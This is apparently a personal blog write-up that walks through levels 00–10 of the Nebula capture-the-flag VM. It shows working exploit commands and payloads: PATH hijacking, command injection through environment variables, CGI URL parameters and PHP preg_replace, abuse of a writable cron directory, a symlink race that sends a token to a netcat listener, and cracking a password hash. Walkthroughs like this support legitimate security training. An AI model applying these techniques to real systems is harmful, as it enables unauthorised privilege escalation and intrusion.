---
extends: default.liquid
title: Cracking Nebula Part 1
date: 2014-06-24T21:03:50Z
---

On [Exploit Exercises](https://www.exploit-exercises.com/) you can find a number of CTF (Capture The Flag) VM images where you can practice your exploiting, hacking and general computer savviness. I've been working my way through the Nebula machine and figured I might as well write up the process both for other's benefit if they get stuck, and also as a sort of diary for myself, so I can refer back to any info if I need to.

The Nebula VM can be downloaded from the [Exploit Exercises download page](https://www.exploit-exercises.com/download)

To quickly explain what you need to do: Login in as user `levelxx` and then run `getflag` as user `flagxx`. There's some explanations for each level on the machine's page over at Exploit Exercises.

## Level 00

> This level requires you to find a Set User ID program that will run as the "flag00" account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
>
> Alternatively, look at the find man page.

So somewhere from the root directory is a file will run as the flag00 user. As stated you can either look for it, or use `find` to search for it. I chose to do a little bit of both. Running `find` from the root of a system can take some time so I chose to take a look first. Amongst the usual directories at linux root level is a `rofs` directory. So let's take a look inside.

```sourceCode
flag00@nebula:/rofs$ ls
bin   dev  home        lib    mnt  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  media  opt  root  sbin  srv      tmp  var
```

Looks the same, but let's run a find in here.

```sourceCode
level00@nebula:/rofs$ find -user flag00 -print 2> /dev/null
./bin/.../flag00
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile
```

There's the usual stuff, but there's also `./bin/.../flag00`. If you run this you can get the flag:

```sourceCode
level00@nebula:/rofs$ ./bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/rofs$ getflag
You have successfully executed getflag on a target account
```

## Level 01

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

So let's see about this vulnerability. It doesn't accept user input, but luckily there's only one place where it actually runs anything, so that makes it easier to narrow down where its weakness is. The `system` call executes an `echo` but there's a small oversight. It calls `echo` without an explicit path, can you see where this is going? As `flag01` runs as user `flag01`, anything it executes will also run under that user.

```sourceCode
level01@nebula:/home/flag01$ mkdir /tmp/mybin
level01@nebula:/home/flag01$ cd /tmp/mybin
level01@nebula:/tmp/mybin$ which getflag
/bin/getflag
level01@nebula:/tmp/mybin$ cp /bin/getflag echo
level01@nebula:/tmp/mybin$ cd ~flag01
level01@nebula:/home/flag01$ export PATH=/tmp/mybin:${PATH}
level01@nebula:/home/flag01$ ./flag01
You have successfully executed getflag on a target account
```

## Level 02

> There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

 asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);

  system(buffer);
}
```

This is very similar to _Level01_ but this time they seem to have patched the system call. However this time they've added something to the statement that we have control over. Look at line 22 and think about how we can make use of that.

```sourceCode
level02@nebula:/home/flag02$ export USER='"";getflag'
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo "";getflag is cool")

You have successfully executed getflag on a target account
```

## Level 03

> Check the home directory of flag03 and take note of the files there.
>
> There is a crontab that is called every couple of minutes.

So first things first let's take a look at that crontab

```sourceCode
level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Ok, so it will take a shell script in the `writeable.d` directory, execute it and then delete it. Luckily the directory is world read/write, allowing us to add out own script. As the crontab will run the script as the `flag03` user, we might as well just run the `getflag` from it. We'll capture some output to make sure it worked.

```sourceCode
level03@nebula:/home/flag03$ cat writeable.d/getit
/bin/getflag > /tmp/gotit
# wait for the script to run....
level03@nebula:/home/flag03$ cat /tmp/gotflag
You have successfully executed getflag on a target account
```

## Level 04

> This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf("%s [file to read]\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
    err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

Ok, so let's take a look at what happens when we run the file

```sourceCode
level04@nebula:/home/flag04$ ls
flag04  token
level04@nebula:/home/flag04$ ./flag04
./flag04 [file to read]
level04@nebula:/home/flag04$ ./flag04 token
You may not access 'token'
```

So we can't access token. Looking at the code there's a check to see if the file is named `token`. We can't simply copy the _token_ file because it's read only by the flag user. So there's only one thing for it: symlinks

Then get the flag (some ssh output cut for brevity)

```sourceCode
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/myfile
level04@nebula:/home/flag04$ ./flag04 /tmp/myfile
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ ssh flag04@localhost

flag04@localhost's password:

flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
```

So the output of the command is a _token_ which is the term used for the password of the flag's user. Using this to logon as _flag04_ and run `getflag`.

## Level 05

> Check the flag05 home directory. You are looking for weak directory permissions

Ok, let's do that

```sourceCode
level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

That _backup_ directory looks like our target

```sourceCode
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ tar xvzf backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

Right so let's use these keys to login as _flag05_.

```sourceCode
level05@nebula:/home/flag05/.backup$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 06

> The flag06 account credentials came from a legacy unix system.

To cut a long story short, the way the password is stored for this user is not the same as for the other users. In older \* nix systems the password was stored inside the `/etc/passwd` file. So let's take a look:

```sourceCode
level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

Yep, there's the encrypted password. Grab that line and run it through John The Ripper

```sourceCode
root@kali:~# echo flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh > nebula.txt
root@kali:~# john nebula.txt  -show
flag06:hello:993:993::/home/flag06:/bin/sh

1 password hash cracked, 0 left
```

That's that, now back on the nebula box

```sourceCode
level06@nebula:/home/flag06$ ssh flag06@localhost

flag06@localhost's password: hello

getflag06@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 07

> The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

So the Nebula machine has a webserver running. Checking the config file we can see that it's running on port 7007. The script tells us that it's expecting a `Host` parameter. So let's hit the server from our web browser at the following URL (your IP will depend on what IP your VM has) `https://192.168.56.102:7007/index.cgi?Host=192.168.56.102`

Basically I am pinging the same host. The webpage will display the output of the ping command.

We can't change the ping call, but we have control over what gets passed to the command. Let's craft a special URL

```sourceCode
$> curl https://192.168.56.102:7007/index.cgi?Host=127.0.0.1%20%26%26%20getflag
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.117 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.028/0.060/0.117/0.040 ms
You have successfully executed getflag on a target account
```

Notice we need to encode the URL parms. The plaintext URL is `https://192.168.56.102:7007/index.cgi?Host=127.0.0.1 && getflag`

## Level 08

> World readable files strike again. Check what that user was up to, and use it to log into flag08 account.

Let's take a look then

```sourceCode
level08@nebula:/home/flag08$ ls -la
total 18
drwxr-x--- 1 flag08 level08   60 2014-06-14 14:10 .
drwxr-xr-x 1 root   root     500 2012-08-27 07:18 ..
-rw------- 1 flag08 flag08    13 2014-06-14 14:10 .bash_history
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
```

The only interesting file that's readable here is `capture.pcap`. Let's copy it out and use _Wireshark_ to take a look at it.

```sourceCode
$> scp level08@192.168.56.102:/home/flag08/capture.pcap .

level08@192.168.56.102's password:
capture.pcap                                  100% 8302     8.1KB/s   00:00
```

Once in Wireshark we can see a TCP stream. Right click on one of the entries and select `Follow TCP Stream`. A new window will appear in which we can see a login attempt. Red entries are user input, and blue entries are the server responses. The username is `level08`. The password is... well, take a look. Notice the `7f` entries. Those are deletes.

[<img src="https://i.imgur.com/IEseNUh.png" alt="image" width="400" />](https://i.imgur.com/IEseNUh.png)

So....

```sourceCode
level08@nebula:/home/flag08$ ssh flag08@localhost

flag08@localhost's password: backd00Rmate

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
```

## Level 09

> There's a C setuid wrapper for some vulnerable PHP code...

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

Let's run it to see what it actually does.

```sourceCode
level09@nebula:/home/flag09$ echo [email mail@test.com] > /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
mail AT test dot com
```

So the vulnerable part here is the preg*replace with the \_e* flag. For information on this see [<https://bugs.php.net/bug.php?id=35960>](https://bugs.php.net/bug.php?id=35960).

So there's a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the `preg_replace`. Let's try to simply get a shell as the _flag09_ user and get our flag.

```sourceCode
level09@nebula:/home/flag09$ echo '[email ${${@system('sh')}}]' > /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 10

> The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];

    printf("Connecting to %s:18211 .. ", host); fflush(stdout);

    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);

    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
      printf("Unable to connect to host %s\n", host);
      exit(EXIT_FAILURE);
    }

#define HITHERE ".oO Oo.\n"
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf("Unable to write banner to host %s\n", host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE

    printf("Connected!\nSending file .. "); fflush(stdout);

    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf("Damn. Unable to open file\n");
      exit(EXIT_FAILURE);
    }

    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf("Unable to read from file: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
    }

    write(fd, buffer, rc);

    printf("wrote file!\n");

  } else {
    printf("You don't have access to %s\n", file);
  }
}
```

Now this one take a bit of playing around to get it right. Basically what we are exploiting here is that the file gets checked and then gets used. The `access` call checks the permissions based on the actual user, not the guid user. The file open calls however will run as the guid user. So in between these two calls, we _could_ modify the target file and get the program to read the right file.

So ideally we want to create a symlink to a file we own when the `access` call runs, then replace that symlink with one that points to the token file. This relies heavily on timing when to update the symlink. I had a play and this is the most reliable way I have found.

You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port

```sourceCode
level10@nebula:~$ nc -l 18211
```

in termA we create our symlink, then run the command along with a command to update the symlink

```sourceCode
level10@nebula:/home/flag10$ touch /tmp/mytoken
level10@nebula:/home/flag10$ ln -fs /tmp/mytoken /tmp/getme
level10@nebula:/home/flag10$ ./flag10 /tmp/getme 192.168.0.8 & ln -fs /home/flag10/token /tmp/getme
[1] 7359
Connecting to 192.168.0.8:18211 .. level10@nebula:/home/flag10$ Connected!
Sending file .. wrote file!
```

Meanwhile, back in termB

```sourceCode
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
level10@nebula:~$ ssh flag10@localhost

flag10@localhost's password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```

[Part 2 of Cracking Nebula](https://unlogic.co.uk/2014/07/02/cracking-nebula-part2/)
